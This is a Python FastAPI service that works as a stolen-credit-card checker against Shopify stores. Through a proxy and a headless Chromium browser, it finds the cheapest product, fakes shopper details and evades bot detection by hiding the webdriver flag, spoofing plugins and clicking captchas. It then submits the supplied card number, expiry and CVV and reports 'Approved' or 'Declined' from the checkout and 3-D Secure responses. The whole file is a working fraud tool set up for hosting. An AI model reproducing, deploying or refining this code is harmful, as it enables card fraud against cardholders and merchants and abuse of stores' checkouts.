import sys
import asyncio
import threading
import os

if sys.platform == 'win32':
    asyncio.set_event_loop_policy(asyncio.WindowsProactorEventLoopPolicy())

from fastapi import FastAPI, Query
from fastapi.responses import JSONResponse
from playwright.sync_api import sync_playwright
import random
import re
import requests
import time
import uvicorn

app = FastAPI()

browser_queue = threading.Semaphore(3)

def format_proxy(proxy_str):
    if not proxy_str: return None
    proxy_str = proxy_str.replace('http://', '').replace('https://', '')
    parts = proxy_str.split(':')
    if len(parts) == 4: return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
    elif len(parts) == 2: return f"http://{parts[0]}:{parts[1]}"
    return f"http://{proxy_str}"

def safe_response(msg, price="-", status="Declined", gate="Shopify Universal Master"):
    if any(x in msg.lower() for x in ["approved", "success", "thank you", "ds_required", "order completed", "otp"]):
        status = "Approved"
    return {"Status": status, "Response": msg, "Price": price, "Gate": gate}

@app.get("/code/index.php")
def shopify_hybrid_api(cc: str = Query(...), url: str = Query(...), proxy: str = Query(None)):
    try:
        cc_parts = re.findall(r'\d+', cc.replace('|', ' '))
        if len(cc_parts) < 4: return JSONResponse(content=safe_response("Invalid CC Format"))
        cc_num, mm, yy, cvv = cc_parts[0], cc_parts[1], cc_parts[2], cc_parts[3]
        if len(yy) == 2: yy = "20" + yy

        store_url = url.rstrip('/')
        proxy_url = format_proxy(proxy)
        
        fn = random.choice(["Alex", "John", "Mike", "Sarah", "David"])
        ln = random.choice(["Smith", "Doe", "Johnson", "Brown", "Taylor"])
        email = f"{fn.lower()}{ln.lower()}{random.randint(1000,9999)}@gmail.com"
        phone = f"302448{random.randint(1000, 9999)}"
        
        print(f"\n=====================================")
        print(f"🚀 [1] بدء فحص: {cc_num[:6]}... المتجر: {store_url}")

        for attempt in range(1, 3):
            variant_id, price = None, "-"
            
            try:
                req_proxies = {"http": proxy_url, "https": proxy_url} if proxy_url else None
                r = requests.get(f"{store_url}/products.json?limit=250", proxies=req_proxies, verify=False, timeout=15.0)
                if r.status_code == 200:
                    all_variants = []
                    for p in r.json().get('products', []):
                        for v in p.get('variants', []):
                            if v.get('available'): 
                                try:
                                    v_price = float(v.get('price', 0))
                                    if v_price > 0:
                                        all_variants.append((v_price, str(v.get('id')), str(v.get('price'))))
                                except: pass
                    
                    if all_variants:
                        all_variants.sort(key=lambda x: x[0])
                        variant_id = all_variants[0][1]
                        price = all_variants[0][2]
            except: pass

            if not variant_id: 
                if attempt == 1:
                    print("♻️ المحاولة 1 فشلت (جلب المنتج). جاري المحاولة مرة أخرى...")
                    continue
                print(f"❌ المتصفح لم يفتح: البروكسي ميت نهائياً أو لا توجد منتجات.")
                return JSONResponse(content=safe_response("Product Not Found / Proxy Dead"))

            if attempt == 1:
                print(f"✅ [2] تم إيجاد أرخص منتج بدقة: {variant_id} بسعر {price}")

            with browser_queue:
                with sync_playwright() as p:
                    proxy_settings = None
                    if proxy_url:
                        from urllib.parse import urlparse
                        p_parsed = urlparse(proxy_url)
                        proxy_settings = {
                            "server": f"http://{p_parsed.hostname}:{p_parsed.port}",
                            "username": p_parsed.username,
                            "password": p_parsed.password
                        }

                    browser = p.chromium.launch(
                        headless=True, 
                        proxy=proxy_settings,
                        args=[
                            "--disable-blink-features=AutomationControlled", 
                            "--disable-infobars",
                            "--no-sandbox", 
                            "--disable-setuid-sandbox", 
                            "--disable-dev-shm-usage", 
                            "--disable-gpu",
                            "--window-size=1280,720"
                        ]
                    )
                    
                    context = browser.new_context(
                        viewport={'width': 1280, 'height': 720},
                        user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                        ignore_https_errors=True
                    )
                    
                    context.add_init_script("""
                        Object.defineProperty(navigator, 'webdriver', {get: () => undefined});
                        Object.defineProperty(navigator, 'plugins', {get: () => [1, 2, 3]});
                        Object.defineProperty(navigator, 'languages', {get: () => ['en-US', 'en']});
                    """)
                    
                    page = context.new_page()

                    blocked_urls = ["google-analytics", "facebook.net", "tiktok.com", "hotjar", "pinterest"]
                    def intercept_route(route):
                        if route.request.resource_type in ["media", "image", "font"] or any(b in route.request.url for b in blocked_urls):
                            route.abort()
                        else:
                            route.continue_()
                    page.route("**/*", intercept_route)

                    final_bank_response = "Waiting"
                    payment_clicked = False

                    def intercept_response(response):
                        nonlocal final_bank_response, payment_clicked
                        if not payment_clicked: return
                        
                        url_res = response.url.lower()
                        if any(x in url_res for x in ['step_up', 'authenticate', 'cardinal', '3d_secure']):
                            final_bank_response = "Approved 🟢 | DS_REQUIRED (OTP)"
                            return

                        if "graphql" in url_res or "processing" in url_res or ".json" in url_res:
                            try:
                                json_data = response.json()
                                j_str = str(json_data).lower()
                                
                                if "ds_required" in j_str or "nextaction" in j_str or "3d_secure" in j_str or "redirect_url" in j_str:
                                    final_bank_response = "Approved 🟢 | DS_REQUIRED (OTP)"
                                    return
                                    
                                if isinstance(json_data, dict):
                                    receipt = json_data.get('data', {}).get('receipt', {})
                                    if receipt.get('__typename') == 'FailedReceipt':
                                        code = receipt.get('processingError', {}).get('code', '')
                                        msg = receipt.get('processingError', {}).get('messageUntranslated', '')
                                        if code: final_bank_response = f"Declined: {code} - {msg}"
                                        return
                                    elif receipt.get('__typename') == 'ProcessedReceipt':
                                        final_bank_response = "Approved 🟢 | Order Completed 💎"
                                        return
                                        
                                    if json_data.get("status") in ["error", "failure"]:
                                        err = json_data.get("error", {}).get("message", "Bank Rejected")
                                        final_bank_response = f"Declined: {err}"
                                        return
                            except: pass
                    
                    page.on("response", intercept_response)

                    try:
                        if attempt == 1: print(f"🔗 [3] فتح صفحة الدفع (مخفي)...")
                        page.goto(f"{store_url}/cart/{variant_id}:1", timeout=30000, wait_until="domcontentloaded")

                        try:
                            c_frame = page.frame_locator('iframe[src*="hcaptcha.com"]')
                            if c_frame.locator('#checkbox').is_visible(timeout=500): 
                                c_frame.locator('#checkbox').click()
                        except: pass

                        if attempt == 1: print(f"📍 [4] فرض الدولة والولاية (مخفي)...")
                        try:
                            page.evaluate("""
                                let countrySel = document.querySelector('select[name="countryCode"], select[name="shippingAddress.country"]');
                                if(countrySel) {
                                    countrySel.value = 'US';
                                    countrySel.dispatchEvent(new Event('change', {bubbles: true}));
                                }
                            """)
                        except: pass
                        
                        time.sleep(1.5) 
                        
                        try:
                            page.evaluate("""
                                let stateSel = document.querySelector('select[name="zone"], select[name="shippingAddress.province"]');
                                if(stateSel) {
                                    stateSel.value = 'DE';
                                    stateSel.dispatchEvent(new Event('change', {bubbles: true}));
                                }
                            """)
                        except: pass
                        
                        time.sleep(0.5)

                        if attempt == 1: print(f"✍️ [5] تعبئة الشحن وتخطي الصفحات...")
                        try: page.locator('input[type="email"], input[name="email"], #checkout_email').first.fill(email)
                        except: pass
                        try: page.locator('input[name*="firstName"]').first.fill(fn)
                        except: pass
                        try: page.locator('input[name*="lastName"]').first.fill(ln)
                        except: pass
                        try: page.locator('input[name*="address1"]').first.fill("100 Market St")
                        except: pass
                        try: page.locator('input[name*="city"]').first.fill("Wilmington")
                        except: pass
                        try: 
                            zip_loc = page.locator('input[name*="postalCode"], input[name*="zip"]').first
                            zip_loc.fill("19801")
                            page.keyboard.press("Escape") 
                        except: pass
                        try: page.locator('input[type="tel"]').first.fill(phone)
                        except: pass

                        for _ in range(8):
                            if page.locator('iframe[name^="card-fields-number"]').is_visible():
                                break
                            
                            try:
                                page.evaluate("""
                                    let btns = Array.from(document.querySelectorAll('button, input[type="submit"]'));
                                    let continueBtn = btns.find(b => 
                                        !b.disabled && 
                                        b.offsetParent !== null && 
                                        (b.textContent.toLowerCase().includes('continue') || 
                                         b.textContent.toLowerCase().includes('next') || 
                                         b.value.toLowerCase().includes('continue') || 
                                         b.id === 'continue_button')
                                    );
                                    if(continueBtn) continueBtn.click();
                                """)
                                time.sleep(1.5) 
                            except: pass

                        if attempt == 1: print(f"💳 [6] حقن البطاقة والدفع...")
                        page.wait_for_selector('iframe[name^="card-fields-number"]', timeout=20000)
                        
                        page.frame_locator('iframe[name^="card-fields-number"]').locator('input[name="number"]').first.fill(cc_num)
                        page.frame_locator('iframe[name^="card-fields-expiry"]').locator('input[name="expiry"]').first.fill(f"{mm}{yy[-2:]}")
                        page.frame_locator('iframe[name^="card-fields-verification_value"]').locator('input[name="verification_value"]').first.fill(cvv)

                        payment_clicked = True
                        
                        try:
                            price_els = page.locator('.payment-due__price, strong:has-text("$")')
                            if price_els.count() > 0:
                                raw_price = price_els.last.text_content()
                                matched_price = re.search(r'\$?[\d,]+\.\d{2}', raw_price)
                                if matched_price: 
                                    price = matched_price.group(0).replace('$', '')
                        except: pass

                        for _ in range(50): 
                            if final_bank_response != "Waiting": break

                            try:
                                page.evaluate("""
                                    let btns = Array.from(document.querySelectorAll('button[type="submit"], button#continue_button, button#checkout-pay-button')).reverse();
                                    let payBtn = btns.find(b => 
                                        !b.disabled && 
                                        b.offsetParent !== null && 
                                        !b.textContent.toLowerCase().includes('apply') && 
                                        !b.textContent.toLowerCase().includes('return') && 
                                        (b.textContent.toLowerCase().includes('pay') || 
                                         b.textContent.toLowerCase().includes('complete') || 
                                         b.textContent.toLowerCase().includes('place order') || 
                                         b.id === 'continue_button' || 
                                         b.id === 'checkout-pay-button')
                                    );
                                    if(payBtn) payBtn.click();
                                """)
                            except: pass
                            
                            current_url = page.url.lower()
                            if any(x in current_url for x in ["thank_you", "orders", "post_purchase"]):
                                final_bank_response = "Approved 🟢 | Order Completed 💎"
                                break
                            if any(x in current_url for x in ["authenticate", "step_up", "3d_secure", "cardinal", "vbv"]):
                                final_bank_response = "Approved 🟢 | DS_REQUIRED (OTP)"
                                break

                            try:
                                err = page.locator('.field__message--error, .notice--error, .form__errors, [data-buyer-error]').first
                                if err.is_visible(timeout=100):
                                    err_txt = err.text_content()
                                    if err_txt and "redirect" not in err_txt.lower():
                                        clean_err = err_txt.strip().replace('\n', ' ')
                                        final_bank_response = f"Declined: {clean_err[:70]}"
                                        break
                            except: pass
                            
                            time.sleep(0.3)
                        
                        if final_bank_response == "Waiting":
                            final_bank_response = "Declined: Processing Timeout / Silent Drop"
                        
                        print(f"🎯 النتيجة: {final_bank_response}")
                        return JSONResponse(content=safe_response(final_bank_response, price))
                            
                    except Exception as e:
                        err_msg = str(e)[:150]
                        print(f"❌ خطأ (محاولة {attempt}): {err_msg}")
                        
                        if "Target closed" in err_msg or "Timeout" in err_msg or "ERR_PROXY" in err_msg:
                            if attempt == 1:
                                print("♻️ جاري إعادة الفحص تلقائياً ببروكسي/جلسة جديدة...")
                                time.sleep(1)
                                continue 
                            else:
                                return JSONResponse(content=safe_response(f"Declined: Proxy slow or Blocked", price))
                                
                        return JSONResponse(content=safe_response(f"Error: {err_msg}", price))
                        
                    finally:
                        try: browser.close()
                        except: pass
                        print(f"=====================================\n")

        return JSONResponse(content=safe_response("Critical Error: Max Retries Reached"))

    except Exception as e:
        return JSONResponse(content=safe_response(f"Critical Error: {str(e)}"))

if __name__ == "__main__":
    # تم تعديل البورت ليعمل بشكل ديناميكي مع استضافة Render
    port = int(os.environ.get("PORT", 8000))
    uvicorn.run("api:app", host="0.0.0.0", port=port)
